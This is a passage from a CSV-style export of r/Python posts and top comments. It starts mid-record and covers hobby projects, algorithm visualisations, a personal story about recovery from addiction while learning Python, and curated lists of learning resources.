      return ӏӏ
    
    print(ℐ𝕴(2, 4))  # 6

In case your font gives it away, here's [how it looks for me](https://imgur.com/xz7w1Aj).

Here I'm using two similar symbols to create unique variable names. `aa` for the function name, `ab` and `ba` for the arguments, and `bb` for the sum. Those symbols are:

- `I` latin capital letter I  (`a` in the encoding)
- `\u04cf` cyrillic small letter palochka  (`b` in the encoding)"
Programming + Math + Graphs = Art,kv0u3w,2021-01-11 19:25:05,,Isnt it a little disorienting to code on a curved monitor
And so it begins... I’ve decided to start a new hobby and hopefully I can make some use out of it. Wish me luck!,8m9ei8,2018-05-26 18:50:51,,You took up photography?
[OC] Updated version of my recent maze finding algorithm with source code,empp5x,2020-01-10 19:26:57,,This is a beautiful visualization.  I especially like the yellow spots marking alternative paths.
I found what happens when you change the Mandelbrot Set's power value and animated it with Python,g1xlte,2020-04-16 02:23:51,,huh..... so that's how you get a Reese's peanut butter cup....
Made a small Reddit client that runs on a 0.96 inch OLED display with a Raspberry Pi as my first project written in Python,haq3vc,2020-06-17 20:24:03,,"Awesome work man,
Btw a noob question, can this be made with Arduino?"
From Depressed Addict to Happy 25 Year old Making 65k/year - How learning Python helped save my life,jus4vq,2020-11-16 03:50:59,"Hello all,

&#x200B;

&#x200B;

&#x200B;

&#x200B;

I am new to reddit, and after reading some posts of people expressing their frustration learning Python, I thought I would write about my own story on how learning Python helped save my life, and perhaps more importantly, gave my life meaning. I will try to be as brief as I can in my back story to keep this as relevant to Python as possible, but I feel it would be a disservice to leave it out completely, as my issues with mental health were a primary driver of the motivation I took advantage of to learn Python. I will post a more detailed description of my backstory later in r/addiciton or r/depression_help or something similar. Feel free to skip to the second \*\*\* to go straight to when I started learning python, however I suggest you read the whole post because honestly my whole story is relevant. If I hadn't gone through what I went through, I doubt I would have had the motivation to self-teach myself Python. 

&#x200B;

&#x200B;

&#x200B;

&#x200B;

\*\*\* 

&#x200B;

&#x200B;

&#x200B;

&#x200B;

I grew up in a wealthy, extremely homogenous town within an hour of New York City. I went to a public school, but if you saw the way people dressed, it looked more like a private prep school. The vast majority of the kids in my school had parents who were millionaires. My parents were not. I was an only child, and I grew up in a small apartment on the ""poor"" side of town (""poor"" meaning houses/ apartments went for < 750k). As you can imagine, the social structure of the school was entirely based off the wealth of your parents. So the game was rigged against me from the beginning. I had very few friends at a young age, and most people in my middle school probably would have described me as a ""loser"" or another synonymous term. I was very unhappy and became addicted to video games as a mean to escape my life. During high school, I finally started branching out to meet people from the surrounding towns, who were not nearly as pretentious as the people I grew up with. I made a lot of friends and started to have a legitimate social life. However, with this new social life came a lot of superficiality and drinking/drug using. 

Until my senior year of high school, my grades were mediocre at best. Because I hated my social life at school, I hated school in general. But in my senior year, something changed. I won't detail it in this post, but will certainly get into it more in my next post in r/addiction or r/depression_help . I improved my grades and went to community college for my first year. I ended that year with a 3.9 GPA and an acceptance to one of the best colleges in my state. I transferred to that college and thought my life from there on out would be perfect. I was wrong.

I hated the social scene of my college. I found it to be very superficial and revolved almost entirely around drinking. Later I realized that while this was true for the people I was surrounding myself with, nobody forced me to surround myself with those people. I did it because I thought that this was the only way to enjoy college, and if I didn't, I would be missing out on the experience of my life. Man, what a load of BS I let myself believe. This expectation set me up for failure, and I blamed myself entirely. I thought I was worthless, a loser, and that all the mean things people said about me in my hometown back in middle school were true. I fell into a deep depression and eventually dropped out. 

Towards the end of my time away at this state school, I saw a psychiatrist who prescribed me Adderall and Xanax to treat my depression and learning disabilities. In the beginning, they worked wonders, but they certainly didn't solve the underlying issues, they actually made them worse. After I dropped out, I began to rely on them completely. Before long, I was blacking out all the time as a result of the Xanax, and up for days at a time as a result of the Adderall. It was always one or the other, and I had to use the other to counter the negative effects of one. 

For the next few years, I battled with addiction and depression to the point where I felt hopeless. I would get a week or two or three sober, then relapse. Somehow I managed to go back to a local college during this time, but my grades were mediocre, because I would miss a week of school every time I would relapse. Eventually I went away to rehab for four months. This is where I started to learn Python. I was very fortunate to have parents who loved me enough to spend the money to send me to a place for four months. I know not everyone has this privilege, and it is my goal to pay my parents back the money they spent on me.

&#x200B;

&#x200B;

&#x200B;

&#x200B;

\*\*\*

&#x200B;

&#x200B;

&#x200B;

&#x200B;

The rehab I went to was basically in the middle of nowhere, and while I was inpatient the first month, the last three months I was in what was essentially a nicer version of a sober house. I worked part- time at a restaurant (\~20 hours a week). I had computer access, and I found myself very bored during the first week or two, so I decided to learn something I had always wanted to learn: Programming. I bought a few courses off [udemy.com](https://udemy.com) for \~$12/each (NEVER pay full price of a Udemy course. You can always get them discounted), and started learning. Pretty much anytime I wasn't working or going to AA meetings, I was programming. I essentially replaced my addiction to drugs with an addiction to learning. I really enjoyed it, but in hindsight, I overdid it, as any addict does. I came home after four months, and I fell back into old patterns, and relapsed just before I would have been 6 months sober. I will go into more detail about this in my posts in r/addiction / r/depression_help .

During my time in rehab, I completed 3 Udemy courses on Python, but honestly I only really learned the fundamentals. I've never been a very quick learner, as I have a processing disorder (I was always the last one to finish tests in school and it always took me longer to do assignments etc). I frequently got frustrated, and rarely took breaks. I would spend 4-8 hours a day practicing coding, but much of that time was obsessing over one thing that I couldn't figure out. This was a big part of why I burnt myself out. Later, I found that if I ran into a problem I couldn't figure out, and forced myself to take a break, 95% of the time I would figure it out within 10 minutes of coming back from a 15-20 minute break. The mind is funny like that. 

Fast forward about 6 months and I was back in rehab, this time for only 30 days. I came home and luckily got an internship at a very small investment firm, where they used python to trade stocks algorithmically. There, I had a boss who was a very good programmer, and he gave me real projects to do that required me to think critically. He rarely gave me any help. Most of the time when I asked a question he would say ""I know the answer, but you have to figure it out. It's the only way you'll learn"". This frustrated me at the time, but looking back it was probably one of the best things anyone ever did for me. I developed resourcefulness and patience, two incredibly imperative skills for any programmer who wants to be worth his/her salt. During this time, I was taking a few classes at a local college to finally finish my degree, and I was working anywhere from 15-40 hours a week at this investment firm, unpaid. I honestly worked a bit too hard, I almost burnt myself out again, but I managed to get through it. I was very lucky in that my parents helped me financially during this time, which allowed me to focus more on school and work. I had a few relapses during this period, but they were short and mild, so it didn't throw me off track too badly. 

Over this past summer I finished up my degree (I majored in Business) and started looking for jobs. I was sure to put as much of my accomplishments at the small investment firm that involved python on my resume as I could. Covid was (and is) still wreaking havoc on the economy, so I worked extra hard applying to jobs, making connections, and keeping my skills sharp. I honestly probably applied to over 2500 jobs. I only got maybe 3-4 interviews. I had one during the end of the summer that went to the final round, and I was sure I was going to get the job. I didn't. Instead, the company (according to a connection I had made within the company cold-emailing people) decided to hire people from India to save money. I definitely felt pretty hopeless at that point. But I didn't give up. Maybe a month later, I got an interview for a job at a major company as a Data Analyst. I had three rounds of interviews plus I had to send them examples of some of my Python projects. I didn't get my hopes up like I did last time, out of fear of being disappointed. To my surprise, I got the job. I had asked for a 50k salary. They gave me 60k base plus a 5k bonus contingent on my performance, plus great benefits. 

I've been at this job for a little over a month, and I honestly love it. I find myself excited to go to work every day, and the people really like me because I am able to provide real value to the company. In my first month, I worked a lot on automation of otherwise very manual tasks (usually involving excel or emails). I would ask people how many hours per week they would generally spend on such a task and wrote it down. I recently did the math and realized that I have so far saved the company over 750 hours of work per year, and that’s a conservative estimate using a 48 week year (to account for holidays, vacation etc.) and the low end of their estimated range of hours per week. This frees the employees up to work on more value added (and frankly much more interesting) projects. My work there is just beginning, and there are a ton of projects I am really excited about. 

&#x200B;

&#x200B;

&#x200B;

&#x200B;

\### (Please go to the next ### if you have no interest in hearing anything non-Python related)

I can honestly say I am happy now. I have over 4 months sober, and I rarely have any cravings to use drugs anymore. I really think this is largely because I found purpose in my life. That said, I still attend AA meetings often because I know I have to keep my sobriety my first priority. Without it, I have nothing. I also know that life isn't going to be perfect every day. While I do consider myself happy today, I still have bad days. Such is life. I stopped expecting to feel good all the time. Life is not designed that way. Before, I was only ""happy"" if I had a substance in my system. Also, ""happy"" to me was a euphoric rush which felt good, but was never fulfilling. Now I define happiness differently. It doesn't mean I feel good all the time. It means that despite sometimes not feeling good, I can appreciate how lucky I am to be alive and how blessed I am to have been given a second chance. Getting out of the rut that I found myself in a few years ago was the hardest thing I have ever done, but it was 100% worth it. At the risk of sounding corny, I really do believe sometimes you have to fall down hard and struggle getting back up to appreciate your life. 

\###

&#x200B;

&#x200B;

&#x200B;

&#x200B;

Learning Python was part of my journey, and it wasn't easy at all. When I started, I had a lot of doubts that I could do it. I didn't think ""people like me"" would be successful at something like this. Again, I was wrong. While I am certainly not even close to an expert at Programming/Python, I am good enough to be hired at a large company and good enough to make a difference. I'm sure there are people on Reddit and elsewhere that could make me look like I started programming last week. But I try not to compare myself to others. I instead try to compare myself to who I was before, and who I want to be in the future. As I’ve said several times before, I will make another post with more details about my experience with addiction/depression and give my general tips for life there, but for now here are my general tips for learning Python:

&#x200B;

&#x200B;

&#x200B;

&#x200B;

1. I suggest starting with the fundamentals. I used Jose Portilla's Udemy course for this and it was great. I will link it at the bottom along with some other resources.

2. If you struggle motivating yourself to follow online courses, try figuring out a real project to do that can actually help you in everyday life. This could be automating something you do in your job, for school, or just something you think will be fun. 

3. Work Hard. Don't give up. But don't burn yourself out. Take frequent breaks, especially when you get frustrated. 

4. Ask for help. If you’re struggling with a specific problem, r/learnpython is great, along with [Stackoverflow.com](https://Stackoverflow.com) . People have helped me with many problems there.

5. Trust the Process. Programming is a lot like learning an instrument in my opinion. At first it can be grueling and you won’t be able to do much for a while, but after you learn the fundamentals, it becomes incredibly enjoyable. 

6. Be consistent. This is extremely important. Try to set aside a time every day to practice. Even if it’s only 20-30 minutes. 

&#x200B;

&#x200B;

&#x200B;

&#x200B;

There are many more tips that I have but those are the most important ones I can think of. Please feel free to follow me as I hope to be quite active on reddit in the future. If you have any questions, please message me. Whether it's about Python, Addiction, Depression, or whatever else. I'll do my best to answer everyone I can. 

&#x200B;

&#x200B;

&#x200B;

&#x200B;

Thanks.",This is a really inspiring story - Thanks for sharing!
I've created a python program that generates photomosaics from any dataset !,faf0zd,2020-02-28 00:55:22,,"I'll add the source code soon if people are interested !
Edit : [Here](https://github.com/HugoM25/Img_To_Photomosaics) it is !"
Python Virtual Environments: Extreme Advertising Edition,a7dcnk,2018-12-19 01:49:59,,"Remember, a virtual environment a day keeps the [xkcd superfund site](https://xkcd.com/1987/) away. "
Visualizing Bubble Sort,eluz97,2020-01-09 00:28:15,,r/dataisbeautiful
I teach programming to researchers at the University of Bristol. Due to Coronavirus all our teaching has moved online. I've just uploaded my first recorded session covering pandas 🐼,fx3ex8,2020-04-08 17:28:30,,"All of our courses have always had freely-available materials. Many of which are collected at [https://milliams.com/courses/](https://milliams.com/courses/)

The material for this course is at [https://milliams.com/courses/data\_analysis\_python/](https://milliams.com/courses/data_analysis_python/)

As we go through the next months I will be aiming to upload more of our courses as videos."
Shared this one on FB and everyone was confused. :D,g9vesj,2020-04-29 04:54:48,,"(True, True, (True == (True, True, True))"
i made a bot that turns reddit arguments into ace attorney,kz9kh6,2021-01-18 00:33:40,"It's still pretty buggy, I threw it together because my holidays are coming to a close.

Here's an example: https://youtu.be/rvFk8hapDZY

Here's the source code: https://github.com/micah5/ace-attorney-reddit-bot","Dude, this is wonderful. Love it."
MS considers adding Python as official scripting language for Excel 😍 The change proposal currently has 6400 votes.,g4cf2r,2020-04-20 02:13:51,,"That survey has been up for years so I wouldn’t expect it happening anytime soon, though."
Program to Convert an Image into Dice. (w/ code),hzuy44,2020-07-29 13:29:15,,"Can anyone find a 6?
EDIT: Found them on his collar!"
Currency converter - my first web scraping project :),h0chuy,2020-06-10 22:48:11,,"This is a simple currency converter using web scraping for getting up to date currency prices. Also possible to use it offline.

Source:  [https://github.com/dimakiss/Currency-converter](https://github.com/dimakiss/Currency-converter)"
This is one of the most interesting outputs of the particle simulation :),dxq4ea,2019-11-18 02:16:00,,Do all mutations of this eventually converge into one big ball that then disappears or are there others that are similar to this? Or even one that has a stable orbit.
AI basketball analysis web App and API,ggfwfw,2020-05-09 22:00:44,,"Hey, actually it seems so good. Congratulations. These will definitely encourage us to learn ML. Thanks for the inspiration."
Very nice 👍,iqer5r,2020-09-11 07:17:20,,"Pro tip:

Don't write open-ended try/excepts like this cheat sheet does. It's a huge smelly anti-pattern.

https://realpython.com/the-most-diabolical-python-antipattern/

Seriously. It will fuck your shit up."
Double Pendulum made with Processing.py,ci1cg4,2019-07-26 18:50:24,,"I noticed Processing had an interface for Python: [Processing.py](https://py.processing.org/). So, I figured I would try to port [Daniel Shiffman](https://www.youtube.com/watch?v=uWzPe_S-RVE) from the Coding Trains [Double Pendulum Code](https://github.com/CodingTrain/website/blob/master/CodingChallenges/CC_093_DoublePendulum/Processing/CC_093_DoublePendulum/CC_093_DoublePendulum.pde) over to Python and it was ridiculously easy. I'm surprised I hadn't heard of the Python version of Processing so I figured I would share with Reddit.

[Python code here](https://gitlab.com/MisterBiggs/double_pendulum/blob/master/double_pendulum.pyde)"
My First Algorithm in Python! A Recursive Maze Solver,du1l1n,2019-11-10 04:54:37,,"You might be using recursion, but the way it's going about the search is more generally known as backtracking.

Backtracking : Basically, if an algo hits a deadend, it goes back to the last point where a choice was made, and makes a different choice, never repeating an old choice. If it runs out of choices at a particular point, the algo backtracks further.

This works surprisingly well for a wide variety of problems. For example, Sudoku solvers, maze solvers,  etc."
Instagram in Terminal,87ey18,2018-03-27 10:28:16,,This is exactly what I've been looking for.
Really??,7oaay5,2018-01-05 18:05:28,,"Well, they got to 2nd level guru (i.e. jaded to death, checking out the grass colour on the other side) fast."
"This morning I decided to learn how to code in Python and after watching a YouTube course on the basics of the language, I coded this all by myself. It took me like 4 or 5 hours. I feel ashamed and super proud at the same time.",gkhjzt,2020-05-16 05:07:49,,"Looks like you're off to a great start.

By the way, you can put a string as the argument for input() to print a prompt, rather than having a separate print statement before. For example:

    firstname = input(""Enter your first name. "")"
Circle Evolution v0.1 is now available on PyPI. My first big project as a 16 year old. [Github repo & desc in comments],grglgp,2020-05-27 17:35:56,,Great work!! Hoping to see more work from you.
"6 Months of learning Python, 3 Hours of Rendering, here is my first Mandelbrot Zoom",dv7np3,2019-11-12 17:25:25,,Care to share GitHub? :D
Learning python so my wife customized my tumbler.,hsf3ce,2020-07-17 02:21:34,,Not the tumblr I was expecting when I clicked.
Dijkstra's algorithm now running in linear time on a 90x90 grid,fxpf9l,2020-04-09 17:29:47,,"Very cool! Maybe you can add some ""slow"" blocks that the path finder can move through but at increased 'distance' so you can have your Dijkstras really shine -- the algorithm would have to pick between going through the slow blocks or around it.

I checked out your code, and it looks very good! However, in your priority queue you appear to ""de-duplicate"" already. That is not correct unfortunately -- with Dijkstra you cannot deduplicate the queue. When you take something from the priority queue, _that's_ when you check if you already visited it and do nothing if that's the case.

Important in Dijkstra is that there may be a path with more ""hops"" that is actually shorter. A direct edge from A to X may be dist(A,X)=10, while a route via node B may be dist(A,B)=5 and dist(B,X)=3. Since going via B is shorter, you want that one. Even if it's an extra hop. [Here's an ugly paint picture of that graph.](https://imgur.com/a/kdclIgD)

You deal with this by adding (node=X,dist=10) and (node=B,dist=5) to the queue when you loop over the neighbors of A.

    priority queue: {(node=B, dist=5), (node=X, dist=10)}

Because 5 < 10, node B will be visited next. Looping over the neighbors of B reveals this path from B to X of dist 3, which is added as (node X, dist=8). Now your priority queue will look like this:

    priority queue: {(node X, dist=8), (node X, dist=10)}

That's right, node X is in there twice! In Dijkstra, it's perfectly okay to add (node X, dist=8) to the queue if (node X, dist=10) is already in the queue. Since it's a priority queue, it will first grab the dist=8 version first. Then, later on when trying to grab the dist=10 version it's already marked as visited so it won't do anything.

If it never added the (node X, dist=8) it would not have found the shortest path.

Well then why does it work? Very simple, because you use a grid your edge distances are 1. Meaning that when it adds something the first time, it also happens to find the shortest path already. That is why Breadth-First-Search, which only works when all edge distances are 1, can use a very simple FIFO queue instead of a priority queue. BFS can also deduplicate _before_ the queue."
Tuesday Daily Thread: Advanced questions,nevt2r,2021-05-18 08:00:14,"Have some burning questions on advanced Python topics? Use this thread to ask more advanced questions related to Python.

**If your question is a beginner question we hold a beginner Daily Thread tomorrow (Wednesday) where you can ask any question! We may remove questions here and ask you to resubmit tomorrow.**

This thread may be fairly low volume in replies, if you don't receive a response we recommend looking at r/LearnPython or joining the Python Discord server at [https://discord.gg/python](https://discord.gg/python) where you stand a better chance of receiving a response.","Does anyone know of a good vector graphics package that doesn't depend on Cairo? I'm writing my first app, and having difficulty getting it installed on Android, to the point where it may be worth redoing the rendering part with a package that's more compatible."
"I created a maze generator, then solved it with Djikstra's algorithm",ean4f7,2019-12-15 02:15:43,, [https://github.com/ravenkls/Maze-Generator-and-Solver](https://github.com/ravenkls/Maze-Generator-and-Solver)
I made the rotating circle *illusion* from numberphile's lates video,hbg6dw,2020-06-18 22:57:56,,Why is it an illusion?
Fluid simulation in Python,fkk7aa,2020-03-18 13:09:55,,"Repo: https://github.com/GregTJ/stable-fluids

While an earlier version was based mostly on Nvidia's GPU gems article on fluid simulation, some valuable insights were gained through this blog post: http://www.philipzucker.com/annihilating-my-friend-will-with-a-python-fluid-simulation-like-the-cur-he-is/

I hope to add surface tracking, multigrid solving, proper boundary conditions, and lagrangian (FLIP) solving soon."
Python Logo Candy,rgaoy7,2021-12-15 00:05:35,,"I do some design work here and there, and recently I have been trying to learn how to use Blender! As a practice, I am working on this concept that I call Logo Candy, which, as you can see, it's about turning logos into these 3d candy-looking objects. I would love to hear what you guys think!

Also, I have uploaded the full-sized image (4k res at 30MB) [here for anyone interested](https://logsnag.com/candy/python), and I will be adding more as I work on other logos.

I am also creating a [community](https://discord.gg/j7mN5KjG) to bring designers and developers together if anyone is interested in that :)

Edit: never post a 30mb image to reddit without a CDN."
I made a program that gives me INFINITE STORAGE!,j620fv,2020-10-06 17:25:39,"So, like the title says, I made a program using python that gives me infinite storage. More specifically it takes advantage of YouTube's infinite upload limit to use YouTube as a 100% free and unlimited cloud storage solution.

Demo video: https://youtu.be/yu_ZIr0q5rU

Source code (definitely still needs more work): https://github.com/AlfredoSequeida/fvid/",wait until youtube compresses your video
When a software developer weds a software developer.,bwukf3,2019-06-05 05:47:08,,NameError: name 'Bardak' is not defined
"My first Python program! Changes my desktop background based on the weather, time, and day.",gfkuez,2020-05-08 10:42:05,,You probably shouldn't keep your API key public. :)
Dear python2 user,bun5px,2019-05-30 09:26:48,,"I killed my libraries support for python 2 last Friday. It feels good to get rid of six, future, scans it, and pathlib2 and really start doing type annotations properly.

People are already trying to get me to change my mind.  But my company uses Anaconda...use a virtual environment; Anaconda lets you have multiple versions of python.  It’s coming like a train and all my dependencies have moved on.  Time for me to as well."
Monday Daily Thread: Project ideas!,ne1kkx,2021-05-17 08:00:18,Comment any project ideas beginner or advanced in this thread for others to give a try! If you complete one make sure to reply to the comment with how you found it and attach some source code!,I am turning 63 young years in 2021. What is the best route to learn Python? I want to keep my mind as sharp as possible.
So true!,ap4hyq,2019-02-10 22:48:26,,"Hm, I would argue that both are typically written in PowerPoint.

Dev: yeah I added couple ifs to check for condition X.

Marketing team: uses AI and ML to automatically detect X."
"I know Python basics, what next?",i0m2sy,2020-07-30 21:31:07,"**tl;dr** Resources (exercises, projects, debugging, testing, cheatsheets, books) to help take the next steps after learning Python basics. I'd welcome feedback and suggestions.

---

What to learn next is an often asked question. [Searching for `what next` on /r/learnpython](https://www.reddit.com/r/learnpython/search?q=what+next&restrict_sr=on) gives you too many results. Here's some more Q&A and articles on this topic:

* [I know how to program, but I don't know what to program](https://www.devdungeon.com/content/i-know-how-program-i-dont-know-what-program)
* [Learning by converting code from one language to another](https://www.reddit.com/r/learnpython/comments/5503pa/code_conversion_probably_the_best_tool_any_level/)
* [Write a command-line utility](https://www.reddit.com/r/learnprogramming/comments/7m92i1/coding_idea_write_a_commandline_utility/)
* [If you want to learn you'll need to be willing to look stupid](https://www.reddit.com/r/learnprogramming/comments/5jm97p/if_you_want_to_learn_youll_need_to_be_willing_to/)
* [Techniques for Efficiently Learning Programming Languages](http://www.flyingmachinestudios.com/programming/learn-programming-languages-efficiently/)
* [Things you might encounter in your programming journey](https://www.techinasia.com/talk/27-things-started-programming)

## Exercises and Projects

I do not have a simple answer to this question either. If you feel comfortable with programming basics and Python syntax, then exercises are a good way to test your knowledge. The resource you used to learn Python will typically have some sort of exercises, so those would be ideal as a first choice. I'd also suggest using the below resources to improve your skills. If you get stuck, reread the material related to those topics, search online, ask for clarifications, etc  — in short, make an effort to solve it. It is okay to skip some troublesome problems (and come back to it later if you have the time), but you should be able to solve most of the beginner problems. Maintaining notes will help too, especially for common mistakes.

* [Exercism](https://exercism.io/tracks/python/exercises), [Practicepython](https://www.practicepython.org/), [Edabit](https://edabit.com/challenges/python3) — these are all beginner friendly and difficulty levels are marked
* [Codewars](https://www.codewars.com/), [Adventofcode](https://adventofcode.com/), [Projecteuler](https://projecteuler.net/) — more challenging
* [Checkio](https://py.checkio.org/), [Codingame](https://www.codingame.com/start), [Codecombat](https://codecombat.com/play/level/dungeons-of-kithgard) — gaming based challenges
* [/r/dailyprogrammer](https://www.reddit.com/r/dailyprogrammer) — not active currently, but there's plenty of past challenges with discussions

Once you are comfortable with basics and syntax, the next step is projects. I use a 10-line program that solves a common problem for me — adding `body { text-align: justify }` to `epub` files that are not justify aligned. I didn't know that this line would help beforehand, I searched online for a solution and then automated the process of unzipping `epub`, adding the line and then packing it again. That will likely need you to lookup documentation and go through some stackoverflow Q&A as well. And once you have written the solution and use it regularly, you'll likely encounter corner cases and features to be added. I feel this is a great way to learn and understand programming.

* [Projects on various topics with solutions](https://github.com/karan/Projects-Solutions)
* [Project based learning](https://github.com/tuvtran/project-based-learning#python)
* [Pytudes by Peter Norvig](https://github.com/norvig/pytudes)
* [Rosettacode](https://rosettacode.org/wiki/Category:Python)

## Debugging

Knowing how to debug your programs is crucial and should be ideally taught right from the beginning instead of a chapter at the end of the book. [Think Python](https://greenteapress.com/wp/think-python-2e/) is an awesome example for such a resource material.

Sites like [Pythontutor](http://www.pythontutor.com/visualize.html#mode=edit) allow you to visually debug a program — you can execute a program step by step and see the current value of variables. Similar feature is typically provided by IDEs like [Pycharm](https://www.jetbrains.com/pycharm/) and [Thonny](https://thonny.org/). Under the hood, these visualizations are using the [pdb module](https://docs.python.org/3/library/pdb.html). See also [Python debugging with pdb](https://realpython.com/python-debugging-pdb/).

Debugging is often a frustrating experience. Taking a break helps (and sometimes I have found the problem in my dreams). Try to reduce the code as much as possible so that you are left with minimal code necessary to reproduce the issue. Talking about the problem to a friend/colleague/inanimate-objects/etc can help too — known as [Rubber duck debugging](https://rubberduckdebugging.com/). I have often found the issue while formulating a question to be asked on forums like stackoverflow/reddit because writing down your problem is another way to bring clarity than just having a vague idea in your mind. Here's some more articles on this challenging topic:

* [What does debugging a program look like?](https://jvns.ca/blog/2019/06/23/a-few-debugging-resources/)
* [How to debug small programs](https://ericlippert.com/2014/03/05/how-to-debug-small-programs/)
* [Debugging guide](https://uchicago-cs.github.io/debugging-guide/)
* [Problem solving skills](https://ryanstutorials.net/problem-solving-skills/)

Here's an interesting snippet (modified to keep it small) from a collection of [interesting bug stories](https://stackoverflow.com/questions/169713/whats-the-toughest-bug-you-ever-found-and-fixed).

>A jpeg parser choked whenever the CEO came into the room, because he always had a shirt with a square pattern on it, which triggered some special case of contrast and block boundary algorithms.

See also [curated list of absurd software bug stories](https://500mile.email/).

## Testing

Another crucial aspect in the programming journey is knowing how to write tests. In bigger projects, usually there are separate engineers (often in much larger number than code developers) to test the code. Even in those cases, writing a few sanity test cases yourself can help you develop faster knowing that the changes aren't breaking basic functionality.

There's no single consensus on test methodologies. There is [Unit testing](https://en.wikipedia.org/wiki/Unit_testing), [Integration testing](https://en.wikipedia.org/wiki/Integration_testing), [Test-driven development](https://en.wikipedia.org/wiki/Test-driven_development) and so on. Often, a combination of these is used. These days, machine learning is also being considered to reduce the testing time, see [Testing Firefox more efficiently with machine learning](https://hacks.mozilla.org/2020/07/testing-firefox-more-efficiently-with-machine-learning/) for example.

When I start a project, I usually try to write the programs incrementally. Say I need to iterate over files from a directory. I will make sure that portion is working (usually with `print` statements), then add another feature — say file reading and test that and so on. This reduces the burden of testing a large program at once at the end. And depending upon the nature of the program, I'll add a few sanity tests at the end. For example, for my [command_help](https://github.com/learnbyexample/command_help) project, I copy pasted a few test runs of the program with different options and arguments into a separate file and wrote a program to perform these tests programmatically whenever the source code is modified.

For non-trivial projects, you'll usually end up needing frameworks like built-in module `unittest` or third-party modules like `pytest`. See [Getting started with testing in Python](https://realpython.com/python-testing/) and [calmcode: pytest](https://calmcode.io/pytest/introduction.html) for discussion on these topics.

## Intermediate Python resources

* [Official Python docs](https://docs.python.org/3/index.html) — Python docs are a treasure trove of information
* [Calmcode](https://calmcode.io/) — videos on testing, code style, args kwargs, data science, etc
* [Practical Python Programming](https://dabeaz-course.github.io/practical-python/Notes/Contents.html) — covers foundational aspects of Python programming with an emphasis on script writing, data manipulation, and program organization
* [Intermediate Python](https://book.pythontips.com/en/latest/index.html) — covers debugging, generators, decorators, virtual environment, collections, comprehensions, classes, etc
* [Effective Python](https://www.effectivepython.com/) — insight into the Pythonic way of writing programs
* [Fluent Python](https://www.oreilly.com/library/view/fluent-python/9781491946237/) — takes you through Python’s core language features and libraries, and shows you how to make your code shorter, faster, and more readable at the same time
    * [Fluent Python, 2nd Edition](https://www.oreilly.com/library/view/fluent-python-2nd/9781492056348/)
* [Serious Python](https://nostarch.com/seriouspython) — deployment, scalability, testing, and more
* [Pythonprogramming](https://pythonprogramming.net/) — domain based topics like machine learning, game development, data analysis, web development, etc
* [Youtube: Corey Schafer](https://www.youtube.com/user/schafer5/playlists) — various topics for beginners to advanced users

**Algorithms and Design patterns**

* [Problem solving with algorithms and data structures](https://runestone.academy/runestone/static/pythonds/index.html) 
* [GitHub: Awesome algorithms](https://github.com/tayllan/awesome-algorithms)
* [GitHub: Collection of design patterns and idioms](https://github.com/faif/python-patterns)
* [Python design patterns](https://python-patterns.guide/) inspired from [Design Patterns: Elements of Reusable Object-Oriented Software](https://en.wikipedia.org/wiki/Design_Patterns) (also known as **Gang of Four book**)

## Handy cheatsheets

* [Python Crash Course cheatsheet](https://ehmatthes.github.io/pcc_2e/cheat_sheets/cheat_sheets/)
* [Comprehensive Python cheatsheet](https://gto76.github.io/python-cheatsheet/)
* [Scientific Python cheatsheet](https://ipgp.github.io/scientific_python_cheat_sheet/)

I hope these resources will help you take that crucial next step and continue your Python journey. Happy learning :)

---

This content is from my [blog post](https://learnbyexample.github.io/curated-resources/python-intermediate/)","Cant wait to get into that ""i know how to program, but dont know what to program"" link. Hits my issues right on the head 🤣"
"Hey Reddit, here's my comprehensive course on Python Pandas, for free.",lain0r,2021-02-02 08:21:38,"The course is called [Python Pandas For Your Grandpa](https://www.gormanalysis.com/blog/python-pandas-for-your-grandpa/) - So easy your grandpa could learn it. (It's the successor to [Python NumPy For Your Grandma](https://www.gormanalysis.com/blog/python-numpy-for-your-grandma/).)

## Course Curriculum
1. **Introduction**  
  [1.1 Introduction](https://www.gormanalysis.com/blog/python-pandas-for-your-grandpa-1-1-introduction)  
2. **Series**  
  [2.1 Series Creation](https://www.gormanalysis.com/blog/python-pandas-for-your-grandpa-2-1-series-creation)  
  [2.2 Series Basic Indexing](https://www.gormanalysis.com/blog/python-pandas-for-your-grandpa-2-2-series-basic-indexing)  
  [2.3 Series Basic Operations](https://www.gormanalysis.com/blog/python-pandas-for-your-grandpa-2-3-series-basic-operations)  
  [2.4 Series Boolean Indexing](https://www.gormanalysis.com/blog/python-pandas-for-your-grandpa-2-4-series-boolean-indexing)  
  [2.5 Series Missing Values](https://www.gormanalysis.com/blog/python-pandas-for-your-grandpa-2-5-series-missing-values)  
  [2.6 Series Vectorization](https://www.gormanalysis.com/blog/python-pandas-for-your-grandpa-2-6-series-vectorization)  
  [2.7 Series `apply()`](https://www.gormanalysis.com/blog/python-pandas-for-your-grandpa-2-7-series-apply)  
  [2.8 Series View vs Copy](https://www.gormanalysis.com/blog/python-pandas-for-your-grandpa-2-8-series-view-vs-copy)  
  [2.9 Challenge: Baby Names](https://www.gormanalysis.com/blog/python-pandas-for-your-grandpa-2-9-challenge-baby-names)  
  [2.10 Challenge: Bees Knees](https://www.gormanalysis.com/blog/python-pandas-for-your-grandpa-2-10-challenge-bees-knees)  
  [2.11 Challenge: Car Shopping](https://www.gormanalysis.com/blog/python-pandas-for-your-grandpa-2-11-challenge-car-shopping)  
  [2.12 Challenge: Price Gouging](https://www.gormanalysis.com/blog/python-pandas-for-your-grandpa-2-12-challenge-price-gouging)  
  [2.13 Challenge: Fair Teams](https://www.gormanalysis.com/blog/python-pandas-for-your-grandpa-2-13-challenge-fair-teams)  
3. **DataFrame**  
  [3.1 DataFrame Creation](https://www.gormanalysis.com/blog/python-pandas-for-your-grandpa-3-1-dataframe-creation)  
  [3.2 DataFrame To And From CSV](https://www.gormanalysis.com/blog/python-pandas-for-your-grandpa-3-2-dataframe-to-and-from-csv)  
  [3.3 DataFrame Basic Indexing](https://www.gormanalysis.com/blog/python-pandas-for-your-grandpa-3-3-dataframe-basic-indexing)  
  [3.4 DataFrame Basic Operations](https://www.gormanalysis.com/blog/python-pandas-for-your-grandpa-3-4-dataframe-basic-operations)  
  [3.5 DataFrame `apply()`](https://www.gormanalysis.com/blog/python-pandas-for-your-grandpa-3-5-dataframe-apply)  
  [3.6 DataFrame View vs Copy](https://www.gormanalysis.com/blog/python-pandas-for-your-grandpa-3-6-dataframe-view-vs-copy)  
  [3.7 DataFrame `merge()`](https://www.gormanalysis.com/blog/python-pandas-for-your-grandpa-3-7-dataframe-merge)  
  [3.8 DataFrame Aggregation](https://www.gormanalysis.com/blog/python-pandas-for-your-grandpa-3-8-dataframe-aggregation)  
